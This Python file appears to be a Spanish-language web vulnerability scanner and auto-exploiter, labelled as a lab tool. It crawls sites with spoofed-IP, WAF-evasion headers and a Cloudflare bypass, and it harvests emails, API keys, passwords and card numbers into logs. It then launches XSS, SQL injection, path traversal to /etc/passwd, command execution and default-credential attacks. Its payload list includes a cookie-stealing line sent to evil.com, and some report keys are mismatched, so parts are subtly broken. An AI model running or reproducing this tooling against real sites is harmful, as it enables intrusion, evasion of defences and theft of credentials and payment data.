import requests
from bs4 import BeautifulSoup, Comment
import re
from urllib.parse import urljoin, urlparse, parse_qs, unquote
import argparse
from collections import defaultdict
import random
import threading
import base64
import binascii
import sys
import time
from datetime import datetime
import os

sys.path.append('./scripts')
from scripts.oner import advanced_cf_bypass
sys.path.append('./exploits')
from exploits.fun import (
    exploit_xss,
    exploit_sql_injection,
    exploit_lfi,
    exploit_rce,
    exploit_custom,
    exploit_massive,
    exploit_chain,
)
# Importa los payloads XSS avanzados
from exploits.fun import xss_payloads

try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
except ImportError:
    print("Instala 'rich' para una mejor experiencia visual: pip install rich")
    sys.exit(1)

console = Console()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0)"
]

EMAIL_REGEX = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
API_KEY_REGEX = re.compile(r"(api[_-]?key|token)[\"'\s:=]+([a-zA-Z0-9_\-]{16,})", re.I)
# Regex específicos para tipos de tarjeta
VISA_REGEX = re.compile(r"\b4[0-9]{12}(?:[0-9]{3})?\b")
MASTERCARD_REGEX = re.compile(r"\b5[1-5][0-9]{14}\b")
AMEX_REGEX = re.compile(r"\b3[47][0-9]{13}\b")
DISCOVER_REGEX = re.compile(r"\b6(?:011|5[0-9]{2})[0-9]{12}\b")
DINERS_REGEX = re.compile(r"\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b")
JCB_REGEX = re.compile(r"\b(?:2131|1800|35\d{3})\d{11}\b")
# Regex genérico para fallback
CARD_REGEX = re.compile(r"\b(?:\d[ -]*?){13,16}\b")
PASSWORD_REGEX = re.compile(r"(password|contraseña)[\"'\s:=]+([^\s\"']+)", re.I)
COMMENT_SECRET_REGEX = re.compile(r"(secret|api[_-]?key|token|password|contraseña)[\s:=]+[^\s]+", re.I)
BASE64_REGEX = re.compile(r"(?:[A-Za-z0-9+/]{16,}={0,2})")
HEX_REGEX = re.compile(r"\b(?:[0-9a-fA-F]{16,})\b")
JS_STRING_REGEX = re.compile(r"(?:var|let|const)\s+([a-zA-Z0-9_]+)\s*=\s*['\"]([^'\"]+)['\"]", re.I)

INSECURE_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"
]

report = defaultdict(list)
lock = threading.Lock()
scanned_count = 0
start_time = datetime.now()

def try_decode_base64(s):
    try:
        decoded = base64.b64decode(s).decode('utf-8')
        if any(x in decoded.lower() for x in ['key', 'token', 'pass', 'secret', '@']):
            return decoded
    except Exception:
        pass
    return None

def try_decode_hex(s):
    try:
        decoded = bytes.fromhex(s).decode('utf-8')
        if any(x in decoded.lower() for x in ['key', 'token', 'pass', 'secret', '@']):
            return decoded
    except Exception:
        pass
    return None

def save_minimal_log_entry(entry_type, url, value):
    results_dir = os.path.join(os.path.dirname(__file__), "results")
    os.makedirs(results_dir, exist_ok=True)
    log_path = os.path.join(results_dir, f"scan_{datetime.now().strftime('%Y%m%d')}.log")
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(f"[{entry_type}] {url}: {value}\n")

def print_vuln_action(vuln_type, url, detail):
    # Minimalista: solo una línea por acción, colores claros
    console.print(f"[yellow]Ataque/prueba: {vuln_type} en {url} ({detail})[/yellow]")
    # Guardado en tiempo real de hallazgos relevantes
    if "Email" in vuln_type:
        save_minimal_log_entry("EMAIL", url, detail)
    elif "API Key" in vuln_type or "Token" in vuln_type:
        save_minimal_log_entry("APIKEY", url, detail)
    elif "Tarjeta" in vuln_type:
        save_minimal_log_entry("CARD", url, detail)
    elif "Contraseña" in vuln_type or "password" in vuln_type:
        save_minimal_log_entry("PASSWORD", url, detail)
    elif "Comentario" in vuln_type:
        save_minimal_log_entry("COMMENT", url, detail)
    elif "JS" in vuln_type and "Fuga" in vuln_type:
        save_minimal_log_entry("JS_LEAK", url, detail)
    session = requests.Session()
    resp = advanced_cf_bypass(session, url, max_attempts=3, threads=2)
    if resp and resp.status_code == 200:
        console.print(f"[cyan]Bypass avanzado Cloudflare/Nginx OK ({resp.status_code})[/cyan]")
    else:
        console.print(f"[red]Bypass Cloudflare/Nginx fallido[/red]")
    # Minimalista: solo un exploit por tipo
    if "XSS" in vuln_type:
        exploit_xss(url, "q", "<svg/onload=1>", verify_reflection=False, delay=0)
    elif "SQL" in vuln_type or "API Key" in vuln_type or "Token" in vuln_type:
        exploit_sql_injection(url, "id", "' OR 1=1--", delay=0)
    elif "LFI" in vuln_type or "archivo" in vuln_type or "fuga" in vuln_type:
        exploit_lfi(url, "file", "../../etc/passwd", delay=0)
    elif "Contraseña" in vuln_type or "password" in vuln_type:
        exploit_custom(url, method="POST", data={"user":"admin","pass":"admin"}, threads=1, delay=0)
    elif "Cabecera" in vuln_type:
        exploit_custom(url, headers={"X-Test":"test"}, delay=0)
    elif "Tarjeta" in vuln_type:
        exploit_custom(url, method="POST", data={"card":"4111111111111111"}, threads=1, delay=0)
    elif "JS" in vuln_type:
        exploit_rce(url, "cmd", "id", delay=0)

def advanced_xss_payloads():
    # Payloads XSS avanzados y realistas
    return [
        '<svg/onload=alert(1337)>',
        '\"><img src=x onerror=alert(1)>',
        '<script>alert(document.domain)</script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '\'><svg/onload=confirm(1)>',
        '"><svg/onload=prompt(1)>',
        '<math href="javascript:alert(1)">CLICK</math>',
        '<img src="x" onerror="fetch(`//evil.com?c=`+document.cookie)">',
        '<details open ontoggle=alert(1)>',
    ]

def scan_forms(soup, url):
    forms = soup.find_all("form")
    with lock:
        report['forms'] += [(url, len(forms))]
    for i, form in enumerate(forms, 1):
        inputs = form.find_all("input")
        for inp in inputs:
            if inp.get("type") == "password" and not inp.get("autocomplete") == "off":
                with lock:
                    report['password_autocomplete'].append((url, i))
                print_vuln_action("Formulario inseguro", url, f"form #{i} campo password sin autocomplete=off")
            if inp.get("type") in ["text", "search"]:
                # Usa los payloads avanzados importados de fun.py
                for payload in xss_payloads:
                    vector_info = {
                        "url": url,
                        "form_index": i,
                        "input_name": inp.get('name'),
                        "payload": payload
                    }
                    with lock:
                        report['xss_vector'].append(vector_info)
                    print_vuln_action(
                        "Posible XSS",
                        url,
                        f"form #{i} campo {inp.get('name')} payload: {payload}"
                    )
                    break  # Solo registrar el primer payload por input

def luhn_check(card_number):
    digits = [int(d) for d in card_number if d.isdigit()]
    checksum = 0
    parity = len(digits) % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0

def find_credit_cards(text):
    found = set()
    for regex in [VISA_REGEX, MASTERCARD_REGEX, AMEX_REGEX, DISCOVER_REGEX, DINERS_REGEX, JCB_REGEX, CARD_REGEX]:
        for match in regex.findall(text):
            card = re.sub(r"[^\d]", "", match)
            if 13 <= len(card) <= 16 and luhn_check(card):
                found.add(card)
    return list(found)

def scan_sensitive_data(html, url):
    emails = EMAIL_REGEX.findall(html)
    apikeys = API_KEY_REGEX.findall(html)
    # Mejor detección de tarjetas
    cards = find_credit_cards(html)
    passwords = PASSWORD_REGEX.findall(html)
    if emails:
        with lock:
            report['emails'] += [(url, set(emails))]
        print_vuln_action("Email expuesto", url, f"{set(emails)}")
    if apikeys:
        with lock:
            report['apikeys'] += [(url, [k[1] for k in apikeys])]
        print_vuln_action("API Key/Token expuesto", url, f"{[k[1] for k in apikeys]}")
    if cards:
        with lock:
            report['cards'] += [(url, cards)]
        print_vuln_action("Tarjeta expuesta", url, f"{cards}")
    if passwords:
        with lock:
            report['plaintext_passwords'] += [(url, [p[1] for p in passwords])]
        print_vuln_action("Contraseña en texto plano", url, f"{[p[1] for p in passwords]}")
    # Desofuscación base64 y hex en HTML
    base64_hits = BASE64_REGEX.findall(html)
    for b64 in base64_hits:
        decoded = try_decode_base64(b64)
        if decoded:
            with lock:
                report['base64_decoded'].append((url, b64, decoded))
    hex_hits = HEX_REGEX.findall(html)
    for hx in hex_hits:
        decoded = try_decode_hex(hx)
        if decoded:
            with lock:
                report['hex_decoded'].append((url, hx, decoded))

def scan_comments(soup, url):
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    for c in comments:
        if COMMENT_SECRET_REGEX.search(c):
            with lock:
                report['comments_leak'].append((url, c.strip()))
            print_vuln_action("Comentario con posible fuga", url, c.strip())
        # Desofuscación en comentarios
        b64s = BASE64_REGEX.findall(c)
        for b64 in b64s:
            decoded = try_decode_base64(b64)
            if decoded:
                with lock:
                    report['comment_base64_decoded'].append((url, b64, decoded))
        hexs = HEX_REGEX.findall(c)
        for hx in hexs:
            decoded = try_decode_hex(hx)
            if decoded:
                with lock:
                    report['comment_hex_decoded'].append((url, hx, decoded))

def scan_headers(headers, url):
    for h in INSECURE_HEADERS:
        if h in headers:
            with lock:
                report['insecure_headers'].append((url, h, headers[h]))
            print_vuln_action("Cabecera insegura", url, f"{h}: {headers[h]}")

def scan_js(soup, url):
    scripts = soup.find_all("script")
    for script in scripts:
        if script.string:
            js_strings = JS_STRING_REGEX.findall(script.string)
            for var, val in js_strings:
                b64 = try_decode_base64(val)
                if b64:
                    with lock:
                        report['js_base64_decoded'].append((url, var, val, b64))
                    print_vuln_action("JS base64 decodificado", url, f"{var}={b64}")
                hx = try_decode_hex(val)
                if hx:
                    with lock:
                        report['js_hex_decodificado'].append((url, var, val, hx))
                    print_vuln_action("JS hex decodificado", url, f"{var}={hx}")
            if any(x in script.string.lower() for x in ['key', 'token', 'pass', 'secret']):
                with lock:
                    report['js_leak'].append((url, script.string.strip()[:100]))
                print_vuln_action("Fuga en JS", url, script.string.strip()[:100])

def get_internal_links(soup, base_url, domain, exclude):
    links = set()
    for a in soup.find_all("a", href=True):
        href = urljoin(base_url, a['href'])
        parsed = urlparse(href)
        if parsed.netloc == domain and href.startswith(base_url):
            if not any(x in href for x in exclude):
                links.add(href.split('#')[0])
    return links

ADVANCED_WAF_HEADERS = [
    "X-Forwarded-For", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Host", "X-Original-URL", "X-Forwarded-Host", "X-Forwarded-Server",
    "X-HTTP-Method-Override", "X-Real-IP", "CF-Connecting_IP", "True-Client-IP"
]

def bypass_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com"
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7"
        ]),
        "Cookie": f"sessionid={random.randint(100000,999999)}; csrftoken={random.randint(100000,999999)}"
    }
    spoof_ip = f"127.0.0.{random.randint(2,254)}"
    for h in ADVANCED_WAF_HEADERS:
        headers[h] = spoof_ip
    # Métodos HTTP alternativos
    headers["X-HTTP-Method-Override"] = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
    # CDN headers
    headers["CF-IPCountry"] = random.choice(["US", "ES", "FR", "DE"])
    headers["CF-Visitor"] = '{"scheme":"https"}'
    headers["Forwarded"] = f"for={spoof_ip};proto=http;by={spoof_ip}"
    return headers

def randomize_params(url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    # Añade parámetros dummy y cambia el orden
    dummy = {f"dummy{random.randint(1,100)}": [str(random.randint(1000,9999))]}
    all_params = list(qs.items()) + list(dummy.items())
    random.shuffle(all_params)
    new_qs = "&".join(f"{k}={v[0]}" for k, v in all_params)
    new_url = parsed._replace(query=new_qs).geturl()
    return new_url

def log_status(message, style="bold cyan"):
    console.log(f"[{style}]{message}[/{style}]")

def scan_url(url, domain, visited, depth, max_depth, exclude, auth, session, proxy, threads, progress=None, task_id=None):
    global scanned_count
    if url in visited or depth > max_depth:
        return
    with lock:
        visited.add(url)
        scanned_count += 1
        if progress and task_id:
            progress.update(task_id, advance=1, description=f"[cyan]Escaneando: {url}")
    try:
        headers = bypass_headers()
        method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
        req_url = randomize_params(url)
        if method == "GET":
            res = session.get(req_url, headers=headers, timeout=8, auth=auth, proxies=proxy, allow_redirects=True)
        elif method == "POST":
            res = session.post(req_url, headers=headers, timeout=8, auth=auth, proxies=proxy, allow_redirects=True, data={})
        else:
            res = session.request(method, req_url, headers=headers, timeout=8, auth=auth, proxies=proxy, allow_redirects=True)
        soup = BeautifulSoup(res.text, "html.parser")
        console.print(f"[bold green]✔[/bold green] [white]{url}[/white] [dim][{res.status_code}][/dim]")
        scan_forms(soup, url)
        scan_sensitive_data(res.text, url)
        scan_comments(soup, url)
        scan_headers(res.headers, url)
        scan_js(soup, url)
        # Mejor detección XSS en parámetros de URL usando los payloads importados de fun.py
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for k, vlist in qs.items():
            for v in vlist:
                for payload in xss_payloads:
                    vector_info = {
                        "url": url,
                        "param": k,
                        "original_value": v,
                        "payload": payload
                    }
                    with lock:
                        report['xss_vector'].append(vector_info)
                    print_vuln_action(
                        "Posible XSS (param)",
                        url,
                        f"param: {k} valor: {v} payload: {payload}"
                    )
                    break  # Solo un payload por parámetro
                v_dec = unquote(v)
                b64 = try_decode_base64(v_dec)
                if b64:
                    with lock:
                        report['url_base64_decoded'].append((url, k, v, b64))
                hx = try_decode_hex(v_dec)
                if hx:
                    with lock:
                        report['url_hex_decoded'].append((url, k, v, hx))
        if depth < max_depth:
            links = get_internal_links(soup, url, domain, exclude)
            thread_list = []
            for link in links:
                t = threading.Thread(target=scan_url, args=(link, domain, visited, depth+1, max_depth, exclude, auth, session, proxy, threads, progress, task_id))
                thread_list.append(t)
                t.start()
                if len(thread_list) >= threads:
                    for th in thread_list:
                        th.join()
                    thread_list = []
            for th in thread_list:
                th.join()
    except Exception as e:
        with lock:
            report['errors'].append((url, str(e)))
        console.print(f"[bold red]✖[/bold red] [white]{url}[/white] [dim]{str(e)}[/dim]")

def print_report():
    elapsed = (datetime.now() - start_time).total_seconds()
    # UI compacta: tabla sin líneas, menos padding, nombres técnicos completos
    table = Table(box=box.MINIMAL, show_lines=False, pad_edge=False)
    table.add_column("Vulnerabilidad", style="cyan", no_wrap=True)
    table.add_column("Cantidad", style="magenta", justify="right", no_wrap=True)
    table.add_row("Formularios encontrados", str(sum(x[1] for x in report['forms'])))
    table.add_row("Campos de contraseña sin autocomplete=off", str(len(report['password_autocomplete'])))
    table.add_row("Posibles vectores XSS", str(len(report['xss_vector'])))
    table.add_row("Emails expuestos", str(len(report['emails'])))
    table.add_row("Claves API/tokens expuestos", str(len(report['apikeys'])))
    table.add_row("Números de tarjeta expuestos", str(len(report['cards'])))
    table.add_row("Contraseñas en texto plano", str(len(report['plaintext_passwords'])))
    table.add_row("Comentarios HTML con posibles filtraciones", str(len(report['comments_leak'])))
    table.add_row("Cabeceras inseguras detectadas", str(len(report['insecure_headers'])))
    table.add_row("Errores de acceso", str(len(report['errors'])))
    table.add_row("Decodificaciones base64 en HTML", str(len(report['base64_decoded'])))
    table.add_row("Decodificaciones hex en HTML", str(len(report['hex_decoded'])))
    table.add_row("Decodificaciones base64 en comentarios", str(len(report['comment_base64_decoded'])))
    table.add_row("Decodificaciones hex en comentarios", str(len(report['comment_hex_decoded'])))
    table.add_row("Decodificaciones base64 en URL", str(len(report['url_base64_decoded'])))
    table.add_row("Decodificaciones hex en URL", str(len(report['url_hex_decoded'])))
    table.add_row("Decodificaciones base64 en JS", str(len(report['js_base64_decodificados'])))
    table.add_row("Decodificaciones hex en JS", str(len(report['js_hex_decodificados'])))
    table.add_row("Fugas en JS", str(len(report['js_leak'])))
    table.add_row("Total URLs escaneadas", str(scanned_count))
    table.add_row("Tiempo total (s)", f"{elapsed:.2f}")
    console.rule("[bold yellow]Resumen Escaneo[/bold yellow]", style="yellow")
    console.print(table)
    # Detalles compactos
    for key in report:
        if report[key]:
            panel_title = f"{key}"
            panel_content = "\n".join(str(item) for item in report[key][:3])
            if len(report[key]) > 3:
                panel_content += f"\n...({len(report[key])-3} más)"
            console.print(Panel(panel_content, title=panel_title, border_style="red", padding=(0,1)))

def ejemplo_bypass_cloudflare():
    """
    Ejemplo de uso del bypass avanzado a Cloudflare.
    """
    import requests
    session = requests.Session()
    url = "http://localhost:0000"
    resp = advanced_cf_bypass(session, url)
    if resp.status_code == 200:
        print("[Ejemplo Cloudflare] Bypass exitoso, contenido recibido.")
    else:
        print(f"[Ejemplo Cloudflare] Código de estado: {resp.status_code}")

def main():
    parser = argparse.ArgumentParser(
        description="Escáner avanzado y robusto de seguridad web para laboratorio. Uso con fines educativos y de investigación.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Ejemplos de uso:
  python main.py --url http://localhost:0000 --depth 2 --threads 8
  python main.py --url http://localhost:0000 --exclude /logout /admin
  python main.py --url http://localhost:0000 --user admin --password admin
  python main.py --url http://localhost:0000 --proxy http://127.0.0.1:8080
  python main.py --url http://localhost:0000 --threads 10 --timeout 20 --no-verify-ssl
  python main.py --url http://localhost:0000 --headers "X-Test:1" "X-Bypass:yes"
  python main.py --url http://localhost:0000 --cookies "sessionid=12345" "csrftoken=abcdef"
"""
    )
    parser.add_argument("--url", default="http://localhost:0000", help="URL base a escanear (ej: http://localhost:0000)")
    parser.add_argument("--depth", type=int, default=2, help="Profundidad máxima de escaneo (default: 2)")
    parser.add_argument("--exclude", nargs='*', default=[], help="Rutas a excluir (ej: /logout /admin)")
    parser.add_argument("--user", help="Usuario para autenticación básica HTTP")
    parser.add_argument("--password", help="Contraseña para autenticación básica HTTP")
    parser.add_argument("--proxy", help="Proxy HTTP/S (ej: http://127.0.0.1:8080)")
    parser.add_argument("--threads", type=int, default=5, help="Número de hilos concurrentes (default: 5)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout de requests en segundos (default: 10)")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Desactiva la verificación SSL (inseguro)")
    parser.add_argument("--headers", nargs='*', default=[], help="Cabeceras personalizadas (ej: \"X-Test:1\" \"X-Bypass:yes\")")
    parser.add_argument("--cookies", nargs='*', default=[], help="Cookies personalizadas (ej: \"sessionid=123\" \"csrftoken=abc\")")
    parser.add_argument("--user-agent", help="User-Agent personalizado")
    parser.add_argument("--method", choices=["GET", "POST", "HEAD", "OPTIONS"], help="Método HTTP preferido para requests")
    parser.add_argument("--output", help="Archivo para guardar el reporte")
    parser.add_argument("--only-vulns", action="store_true", help="Mostrar solo vulnerabilidades detectadas")
    parser.add_argument("--silent", action="store_true", help="Modo silencioso (solo resultados finales)")
    parser.add_argument("--show-examples", action="store_true", help="Muestra todos los ejemplos avanzados de uso de la herramienta y sale")
    args = parser.parse_args()

    if args.show_examples:
        console.rule("[bold blue]EJEMPLOS AVANZADOS DE USO[/bold blue]")
        console.print("""
[bold cyan]Escaneo básico:[/bold cyan]
  python main.py --url http://localhost:0000

[bold cyan]Escaneo con profundidad y múltiples hilos:[/bold cyan]
  python main.py --url http://localhost:0000 --depth 3 --threads 10

[bold cyan]Excluyendo rutas y usando autenticación básica:[/bold cyan]
  python main.py --url http://localhost:0000 --exclude /logout /admin --user admin --password admin

[bold cyan]Usando proxy y cabeceras/cookies personalizadas:[/bold cyan]
  python main.py --url http://localhost:0000 --proxy http://127.0.0.1:8080 --headers "X-Test:1" --cookies "sessionid=123"

[bold cyan]Desactivando verificación SSL y cambiando User-Agent:[/bold cyan]
  python main.py --url https://localhost --no-verify-ssl --user-agent "CustomAgent/1.0"

[bold cyan]Forzando método HTTP y timeout personalizado:[/bold cyan]
  python main.py --url http://localhost:0000 --method POST --timeout 20

[bold cyan]Modo silencioso y reporte a archivo:[/bold cyan]
  python main.py --url http://localhost:0000 --silent --output reporte.txt

[bold cyan]Mostrar solo vulnerabilidades detectadas:[/bold cyan]
  python main.py --url http://localhost:0000 --only-vulns

[bold cyan]Mostrar ejemplos avanzados y salir:[/bold cyan]
  python main.py --url http://localhost:0000 --show-examples
""")
        sys.exit(0)

    base_url = args.url
    domain = urlparse(base_url).netloc
    max_depth = args.depth
    exclude = args.exclude
    auth = (args.user, args.password) if args.user and args.password else None
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    threads = args.threads
    timeout = args.timeout
    verify_ssl = not args.no_verify_ssl
    custom_headers = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()
    custom_cookies = {}
    for c in args.cookies:
        if "=" in c:
            k, v = c.split("=", 1)
            custom_cookies[k.strip()] = v.strip()
    user_agent = args.user_agent
    method = args.method
    output_file = args.output
    only_vulns = args.only_vulns
    silent = args.silent

    visited = set()
    session = requests.Session()
    if custom_headers:
        session.headers.update(custom_headers)
    if custom_cookies:
        session.cookies.update(custom_cookies)
    if user_agent:
        session.headers["User-Agent"] = user_agent

    console.rule("[bold green]INICIO DE ESCANEO[/bold green]")
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
        console=console,
        transient=True
    ) as progress:
        task_id = progress.add_task("[cyan]Escaneando...", total=None)
        scan_url(
            base_url, domain, visited, 0, max_depth, exclude, auth, session, proxy, threads,
            progress, task_id
        )
        progress.update(task_id, completed=scanned_count)
    print_report()
    # Mensaje final compacto y avanzado
    vuln_labels = {
        "password_autocomplete": "Campos de contraseña sin autocomplete=off",
        "xss_vector": "Posibles vectores XSS",
        "emails": "Emails expuestos",
        "apikeys": "Claves API/tokens expuestos",
        "cards": "Números de tarjeta expuestos",
        "plaintext_passwords": "Contraseñas en texto plano",
        "comments_leak": "Comentarios HTML con posibles filtraciones",
        "insecure_headers": "Cabeceras inseguras detectadas",
        "base64_decoded": "Decodificaciones base64 en HTML",
        "hex_decoded": "Decodificaciones hex en HTML",
        "comment_base64_decoded": "Decodificaciones base64 en comentarios",
        "comment_hex_decodificado": "Decodificaciones hex en comentarios",
        "url_base64_decodificados": "Decodificaciones base64 en URL",
        "url_hex_decodificados": "Decodificaciones hex en URL",
        "js_base64_decodificados": "Decodificaciones base64 en JS",
        "js_hex_decodificados": "Decodificaciones hex en JS",
        "js_leak": "Fugas en JS",
        "errors": "Errores de acceso detectados"
    }
    found = False
    for key, label in vuln_labels.items():
        if report.get(key):
            found = True
            console.print(f"[yellow]Probando {label}...[/yellow]")
            # Llamada a exploits según el tipo de vulnerabilidad detectada
            if key == "xss_vector":
                exploit_xss(base_url, "q", "<svg/onload=alert(1)>", verify_reflection=False, delay=0.1)
            elif key == "password_autocomplete":
                exploit_custom(base_url, method="POST", data={"user":"admin","pass":"admin"}, threads=1, delay=0.1)
            elif key == "apikeys":
                exploit_sql_injection(base_url, "id", "' OR 1=1--", delay=0.1)
            elif key == "emails":
                exploit_custom(base_url, method="POST", data={"email":"test@test.com"}, threads=1, delay=0.1)
            elif key == "cards":
                exploit_custom(base_url, method="POST", data={"card":"4111111111111111"}, threads=1, delay=0.1)
            elif key == "plaintext_passwords":
                exploit_custom(base_url, method="POST", data={"user":"admin","pass":"admin"}, threads=1, delay=0.1)
            elif key == "comments_leak":
                exploit_lfi(base_url, "file", "../../etc/passwd", delay=0.1)
            elif key == "insecure_headers":
                exploit_custom(base_url, headers={"X-Test":"test"}, delay=0.1)
            elif key == "base64_decoded" or key == "hex_decodificados":
                exploit_custom(base_url, method="POST", data={"data":"test"}, threads=1, delay=0.1)
            elif key == "js_leak":
                exploit_rce(base_url, "cmd", "id", delay=0.1)
    if not found:
        console.print("[green]Sin vulnerabilidades explotables detectadas.[/green]")

if __name__ == "__main__":
    main()
